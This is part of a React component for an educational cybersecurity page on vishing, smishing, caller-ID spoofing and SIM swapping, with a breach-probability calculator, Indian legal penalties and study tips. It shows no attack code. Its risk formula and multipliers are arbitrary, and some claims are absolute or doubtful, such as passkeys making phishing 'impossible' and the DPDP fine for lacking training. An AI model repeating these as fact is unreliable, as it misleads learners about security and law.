                onClick={() => setSelectedThreatKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedThreatKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              &gt;
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  THREAT
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeThreat.categoryBadge)}>
                    {activeThreat.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-gray-300 font-mono">
                    Protocol: {activeThreat.protocolStandard}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeThreat.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Exploitation Vector &amp; Attack Mechanics
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.exploitationVector}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-amber-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Impact &amp; Telemetry Indicator
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeThreat.vulnerabilityImpact}</p>
                  <p className="text-gray-400 text-[11px]">{activeThreat.telemetryIndicator}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Resilient Telephony Defense &amp; Countermeasures
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.resilientDefense}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Technical SIP Header / Code Pattern
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeThreat.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live Mobile Compromise Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. Mobile Compromise Probability &amp; Passkey Armor Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Adjust mobile channel response multiplier M, social engineering persuasion intensity I, and passkey defense armor R 
              to model breach probability P_mobile = 1 - exp(-(M × I) / R) and see how FIDO2 passkeys reduce breach probability below 1.5%:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Channel &amp; Armor Variables</h3>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Mobile Channel Urgency (M):</span>
                  <span className="text-cyan-400 font-bold font-mono">{channelMultiplier.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="4.0"
                  step="0.5"
                  value={channelMultiplier}
                  onChange={(e) => setChannelMultiplier(parseFloat(e.target.value))}
                  className="w-full accent-cyan-500 bg-gray-800"
                /&gt;
              </div>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Persuasion Intensity (I):</span>
                  <span className="text-rose-400 font-bold font-mono">{persuasionIntensity.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="5.0"
                  step="0.5"
                  value={persuasionIntensity}
                  onChange={(e) => setPersuasionIntensity(parseFloat(e.target.value))}
                  className="w-full accent-rose-500 bg-gray-800"
                /&gt;
              </div>

              <div className="space-y-1 pt-1">
                <span className="text-gray-400 block">Passkey Defense Armor (R):</span>
                <div className="grid grid-cols-3 gap-1.5">
                  <button
                    onClick={() => setPasskeyArmorStrength(1)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      passkeyArmorStrength === 1
                        ? "bg-rose-950 border-rose-500 text-rose-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  &gt;
                    SMS OTP (1x)
                  </button>
                  <button
                    onClick={() => setPasskeyArmorStrength(50)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      passkeyArmorStrength === 50
                        ? "bg-amber-950 border-amber-500 text-amber-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  &gt;
                    Push MFA (50x)
                  </button>
                  <button
                    onClick={() => setPasskeyArmorStrength(500)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      passkeyArmorStrength === 500
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  &gt;
                    FIDO2 Passkey (500x)
                  </button>
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Mobile Telephony Telemetry</h3>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Raw Channel Vulnerability</span>
                  <span className="text-lg font-extrabold text-white">{mobileSimulation.rawBreachProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Without Passkey Armor</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Actual Breach Probability</span>
                  <span className="text-lg font-extrabold text-emerald-400">{mobileSimulation.actualBreachProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">With Passkey Armor Active</span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", mobileSimulation.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">Telephony Resilience:</span>
                <p className="mt-1 font-extrabold text-sm">{mobileSimulation.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - Telephony Security Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              SIP Inspection &amp; Entra ID Policy Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Telephony Security &amp; SIP Defense Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production Python SIP header forensic parsers, PowerShell scripts disabling insecure SMS OTPs in Entra ID, 
              and Asterisk PBX dialplans blocking unverified outbound Caller-ID injection:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              &gt;
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Script / Dialplan
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita defeat SIP caller ID spoofing, 
              utility disconnection smishing, and SIM-swapping attacks across West Bengal enterprise networks:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              &gt;
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; Telephony Exploit Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Liabilities for Vishing, Smishing &amp; SIM Swapping in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, telecom regulations, and criminal statutes penalize telephony fraud, 
              caller ID spoofing, and unauthorized account takeovers with severe statutory penalties:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66D
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cheating by Personation:</strong> Operating fraudulent vishing call centers or spoofing numbers carries up to <span className="text-rose-400 font-bold">3 YEARS IMPRISONMENT</span> and fines.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; TRAI DLT
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for unauthorized system access via vishing.
                </li>
                <li>
                  <strong className="text-white">TRAI TCCCPR 2018:</strong> Mandatory DLT blockchain registration for commercial SMS headers.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; CERT-In Mandates
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to implement voice security awareness training.
                </li>
                <li>
                  <strong className="text-white">CERT-In SLA:</strong> Mandatory reporting of all telephony compromises within <strong className="text-white">6 hours</strong>.
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Trusting Caller ID Names on Incoming Phone Calls:</strong> SIP headers can be forged easily on unauthenticated VoIP trunks.
                </li>
                <li>
                  <strong>Relying on SMS OTPs as Secure 2FA:</strong> SIM swapping and AiTM reverse proxies capture SMS codes effortlessly.
                </li>
                <li>
                  <strong>Assuming High-Fidelity Executive Voices are Real:</strong> Generative AI voice clones speak in real time (&lt;150ms).
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Migrate 100% to FIDO2 WebAuthn Passkeys:</strong> Origin binding makes voice OTP theft mathematically impossible.
                </li>
                <li>
                  <strong>Establish Pre-Shared Verbal Duress Words:</strong> Challenge callers on wire transfer requests with secret passphrases.
                </li>
                <li>
                  <strong>Enforce On-Device Mobile Threat Defense (MTD):</strong> Inspect smishing URLs locally via loopback VPN drivers.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why do FIDO2 WebAuthn passkeys defeat 100% of SIM swapping attacks even if the attacker intercepts the mobile number?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  Why does SIP header manipulation allow VoIP gateways to display any arbitrary bank phone number on the victim's phone?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the mobile compromise calculator above, set passkey armor to FIDO2 Passkey (500x) and observe breach risk collapse to 1.3%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Vishing uses live voice calls; Smishing uses SMS text messages with shortened links.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Caller ID spoofing manipulates SIP `From:` headers on unauthenticated VoIP gateways.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>SIM swapping social engineers telecom stores to steal the victim's phone number and 2FA OTPs.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Adversary-in-the-Middle (AiTM) reverse proxies capture session cookies, bypassing SMS OTPs.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>FIDO2 passkeys make phishing impossible because there is no OTP to speak aloud on the phone.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66D of the IT Act penalizes Cheating by Personation with up to 3 years imprisonment.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Voice and SMS Phishing FAQs"
            subtitle="30 Moderate to Expert Practice Questions & Telephony Security Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Voice and SMS Phishing: Vishing and Smishing Attacks (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic4_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Mobile devices are the primary frontline of modern social engineering! Master the mechanisms: understand how SIP Caller ID spoofing manipulates Session Initiation Protocol headers on VoIP trunks, how Smishing leverages truncated mobile screens and regulatory panic (KYC updates / electricity disconnection), and how SIM swapping social engineers telecom carriers to hijack SMS 2FA codes. Observe modern threat evolutions: real-time AI Deepfake Voice Cloning transforms voice characteristics in under 150ms latency to impersonate executives over live calls, while Adversary-in-the-Middle (AiTM) reverse proxies capture session cookies, completely rendering legacy SMS OTPs obsolete! To engineer unbreakable telephony defenses: eliminate SMS OTPs and migrate 100% to FIDO2 WebAuthn passwordless passkeys (since there are no speakable OTPs or passwords), enforce carrier-level STIR/SHAKEN cryptographic caller authentication, require pre-shared verbal duress passphrases for emergency voice requests, and deploy on-device Mobile Threat Defense (MTD) link inspection. Remember that Section 66D of the Indian IT Act treats Cheating by Personation as a severe criminal offense punishable with up to 3 years imprisonment!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic4;
